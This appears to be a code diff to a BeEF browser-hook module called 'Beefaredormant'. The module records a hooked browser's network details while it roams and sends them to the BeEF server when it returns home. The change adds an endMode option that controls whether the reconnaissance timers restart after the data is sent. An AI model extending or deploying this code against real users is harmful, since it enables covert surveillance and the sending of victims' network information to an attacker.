@@ -7,7 +7,7 @@
 // TODO: Why do I use localStorage in this? I mean, I just use JS memory :/
 // Is the idea to recover from localStorage in particular circumstances?
 
-function Beefaredormant(stealth) {
+function Beefaredormant(stealth, end_mode) {
     this.verbLogEnabled = true;
     this.saveLocal = false;
     this.onlineStatus = false;
@@ -30,6 +30,11 @@ function Beefaredormant(stealth) {
     //   - * NOT send back to beef until we return to original network
     //   - * And the BeeF hook is disabled until we return
     this.stealthLevel = stealth;
+
+    // endMode
+    // 0 - just run indefinitely - even after returning home
+    // 1 - after returning home and dumping data - kill all timers (and humans)
+    this.endMode = end_mode;
 
     // outer wrapping function on netrecon
     // this.prototype.outer_sequential = outer;
@@ -385,8 +390,10 @@ Beefaredormant.prototype.backHome = function(rtcresult, externalDetails) {
     this.dumpToBeef(); // Dump *all* of the network info back
   }
 
-  // kick off timer again
-  this.startTimers();
+  if (this.endMode === 0) {
+    // kick off timer again
+    this.startTimers();
+  }
 }
 
 // checkInitialRtcOrIsp checks the new IP address against the first RTC Ip
